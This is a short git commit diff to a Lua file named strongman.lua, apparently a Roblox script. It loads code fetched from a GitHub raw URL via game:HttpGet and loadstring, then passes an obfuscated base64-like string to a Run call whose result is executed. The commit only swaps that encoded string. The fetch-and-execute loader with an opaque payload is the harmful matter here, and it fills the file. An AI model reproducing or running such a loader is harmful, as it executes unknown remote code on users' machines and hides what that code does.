520c8c9958d4595f3a6389fe104a424bf2481665
colcoclc <yasminemseddi15@gmail.com>
2026-07-07 02:21:34 +0100

    Update strongman.lua

--- strongman.lua
+++ strongman.lua
@@ -1,2 +1,2 @@
 local zor = loadstring(game:HttpGet("https://raw.githubusercontent.com/colcoclc/bruh/refs/heads/main/strongman.lua"))()
-zor:Run("XRxIV0xdVxlYVVdBQ1ZFDVUfVwFXT0IFRQtVTVVWAh0=")()
+zor:Run("XE8ZAhEMVEpRUVcbSgBCVgVOVVJRHEoGQFpRSlcFAB0=")()
